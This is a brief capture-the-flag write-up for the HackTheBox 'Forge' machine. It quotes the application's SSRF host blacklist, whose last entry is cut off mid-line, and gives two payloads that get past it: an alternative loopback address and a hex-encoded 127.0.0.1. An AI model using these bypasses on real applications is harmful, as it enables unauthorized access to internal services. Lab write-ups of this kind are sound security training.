# Alternative way to exploit Forge

## Bypassing SSRF Blacklist

The blacklist of the application at _forge.htb_ can be found in _/var/www/forge/forge/routes.py_:
```
blacklist = ["forge.htb", "127.0.0.1", "10.10.10.10", "::1", "localhost",            
             '0.0.0.0', '[0:0:0:0:0:0:0:0
```

This blacklist can be bypassed in several ways to exploit the **SSRF** vulnerability.

Method 1: Using different IP address from the loopback subnet _127.0.0.0/8_:
```
http://127.0.0.2
```

Method 2: Encoding the IP address 127.0.0.1 to hexadecimal:
```
http://0x7f000001
```
